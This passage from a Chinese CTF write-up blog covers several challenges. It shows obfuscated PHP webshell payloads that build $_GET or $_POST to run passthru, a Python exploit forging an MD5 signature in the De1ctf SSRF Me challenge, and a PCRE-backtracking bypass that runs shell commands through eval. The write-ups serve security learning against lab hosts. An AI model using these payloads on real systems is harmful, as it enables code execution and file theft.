<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?looklook=1&amp;1=passthru&amp;2=ls /</span></span><br><span class="line">ctf_show=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D._%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B0%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D_.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B1%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B2%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/09/12/CTFSHOW-shellmeRevenge-wp/0x2.png?raw=true" alt="m"></p>
<h3 id="长度-lt-x3D-107"><a href="#长度-lt-x3D-107" class="headerlink" title="长度&lt;&#x3D;107"></a>长度&lt;&#x3D;107</h3><p>如果<code>10#</code>中的<code>||</code>换成<code>&amp;&amp;</code>的话  就需要压缩我们的payload了</p>
<p>思路：<code>C -&gt; E -&gt; G</code>        <code>T</code>离得比较远 可以通过<code>C/C.C</code>获取到<code>NANC</code>进而  <code>N-&gt;T</code>  </p>
<p><strong>这里</strong>可能有人会想为什么不从<code>Array</code>当中取出<code>r</code>然后到<code>t</code>呢 ？ php对于函数名类名大小写不敏感  但是对于<code>$_GET, $_POST</code>这一类变量是大小写敏感的  所以构造出的<code>$_GEt</code>发挥不了作用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C</span>=(C/C.C)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line"><span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;	<span class="comment">// S，不直接到T  下面拼接的时候行内自增</span></span><br><span class="line"><span class="variable">$_</span>=C;	</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">// E</span></span><br><span class="line"><span class="variable">$C</span>=<span class="variable">$_</span>.++<span class="variable">$C</span>;		<span class="comment">// ET</span></span><br><span class="line"><span class="variable">$_</span>++;	<span class="comment">// F	与第2行逻辑相同</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$_</span>.<span class="variable">$C</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $C=(C/C.C)[0];$C++;$C++;$C++;$C++;$C++;$_=C;$_++;$_++;$C=$_.++$C;$_++;$_=_.++$_.$C;$$_[1]($$_[2]);</span></span><br><span class="line"><span class="comment">// strlen=98</span></span><br></pre></td></tr></table></figure>

<p>更小：直接<code>N -&gt; O -&gt; P -&gt; S -&gt; T</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line">++<span class="variable">$_</span>;	<span class="comment">// O</span></span><br><span class="line"><span class="variable">$__</span>=_.<span class="variable">$_</span>.<span class="variable">$_</span>++;		<span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>;	<span class="comment">// _POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_=(_/_._)[0];$__=++$_;$__=_.++$_.$__;$_++;$_++;$_=$__.++$_.++$_;$$_[0]($$_[1]);</span></span><br><span class="line"><span class="comment">// strlen=80   注意这里是POST了 跟GET传参方式不同</span></span><br></pre></td></tr></table></figure>

<p>再压缩：将<code>_POST</code>作为POST的参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[_];                     <span class="comment">// N  注意这里的索引0有的php版本下也可以替换为非数字字符</span></span><br><span class="line">++<span class="variable">$_</span>;                              </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;                       <span class="comment">// PO</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;                         </span><br><span class="line"><span class="variable">$$_</span>[<span class="variable">$_</span>=_.<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$_</span>[_]);   <span class="comment">// $$_[_POST]($$_[_])即$_POST[]($_POST[_])</span></span><br><span class="line"><span class="comment">// $_=(_/_._)[_];++$_;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);</span></span><br><span class="line"><span class="comment">// strlen=73 		POST  _=ls&amp;_POST=passthru</span></span><br></pre></td></tr></table></figure>

<p>删去换行 url编码后同样可以实现功能</p>
<p>几个压缩点：</p>
<ol>
<li>行内自增完直接用就是新的值：<code>$C=$_.++$C;</code> </li>
<li>多字符串一行拼接<code>$_=_.++$_.$C;</code></li>
<li>找就近字母递增，过程中有遇到符合的记录下，不每次从头开始</li>
<li><code>_/_, 0/0, C/C</code>都可以得到<code>NAN</code></li>
<li><code>[0], [&#39;&#39;==&#39;.&#39;], [_]</code>都有可能起到同样作用</li>
</ol>

	
	</div>
  <a type="button" href="/2023/09/12/CTFSHOW-shellmeRevenge-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/08/De1ctf2019-SSRFMe-wp/" >De1ctf2019 SSRF Me wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-08
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p>打开页面  得到源码 整理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip,</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;scan&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&#x27;Connection Timeout&#x27;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;read&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&#x27;Action Error&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Sign Error&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/geneSign&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    action = <span class="string">&#x27;scan&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&#x27;action&#x27;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&#x27;sign&#x27;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No Hacker!!!!&#x27;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;code.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Connection Timeout&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&#x27;gopher&#x27;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>三个路由：</p>
<ol>
<li><code>/</code> → 展示源码</li>
<li><code>/geneSign</code> → 根据<code>param</code>生成数字签名</li>
<li><code>/De1ta</code> → 在cookie中获取<code>action, sign</code>，并get <code>param</code>（过滤了 gopher 和 file ）  然后新建<code>Task</code>并执行<code>task.Exec</code><ol>
<li><code>21#</code>根据传入的ip生成沙盒文件夹</li>
<li><code>29#</code>根据 param 和 action 检查签名是否有效</li>
<li><code>30#</code>如果 action 中有 <code>scan</code>  则执行 <code>83#</code> ，将结果写入 &#x2F;{sandbox}&#x2F;result.txt </li>
<li><code>40#</code>如果 action 中有 <code>read</code> 则读取 result.txt 并回显</li>
</ol>
</li>
</ol>
<h2 id="0x2-攻击方法"><a href="#0x2-攻击方法" class="headerlink" title="0x2 攻击方法"></a>0x2 攻击方法</h2><p>由于<code>86#</code>urllib.urlopen可以以文件名作为参数打开，尝试scan <code>code.txt</code>然后 read</p>
<p>由于数字签名校验，我们需要先获取sign再向<code>/De1ta</code>发请求    scan方法可以直接通过<code>/geneSign → 63#</code>获取，但是 read 方法不行</p>
<p>且生成需要<code>secret_key</code>（16个随即字节） 不考虑爆破</p>
<p>但同时发现<code>30#</code>和<code>40#</code>判断用的是<code>in</code>而不是<code>is</code>  可能有攻击点  尝试拼接  </p>
<p>很明显  向<code>/De1ta</code>发请求时 <code>action=readscan</code>  这样既会读又会写   向<code>/geneSign</code>请求时只要在param的末尾加上<code>read</code>  这样生成的sign就和<code>53#</code>生成的sign相同  绕过检测</p>
<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/geneSign&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest + <span class="string">&#x27;read&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> requests.post(url=url, params=data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/De1ta&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;readscan&#x27;</span>, <span class="string">&#x27;sign&#x27;</span>: <span class="built_in">str</span>(getSign(dest))&#125;</span><br><span class="line">    res = requests.post(url=url, params=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">get_content(dst)</span><br><span class="line"><span class="comment"># &#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;NSSCTF&#123;cbbd7581-79f0-4636-b907-c45578de18f6&#125;\n&quot;&#125;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/08/De1ctf2019-SSRFMe-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/05/NISACTF2022-middlerce-wp/" >NISACTF2022-middlerce-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-05
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>严格正则过滤，尝试PCRE回溯绕过</p>
<blockquote>
<p>具体见 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
</blockquote>
<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;system(\&#x27;ls\&#x27;);&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># 回溯得用@^等特殊字符</span></span><br><span class="line">data = &#123; <span class="string">&#x27;letter&#x27;</span>: js &#125;</span><br><span class="line">res = requests.post(url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28296/&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>但是得到<code>差一点点捏</code>  尝试多次发现system, exec, assert等都被过滤   尝试使用短标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`ls`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>?&gt;闭合了eval自带的&lt;?标签  接下来使用了短标签   <code>&lt;?=</code>相当于<code>&lt;?echo</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`nl /f*`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># cat, tac, flag都被过滤</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/05/NISACTF2022-middlerce-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/" >X-CTF Quals2016 b0verfl0w-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-05
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p>[相关资源](<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w)  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec b0verfl0w</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>明显栈溢出</p>
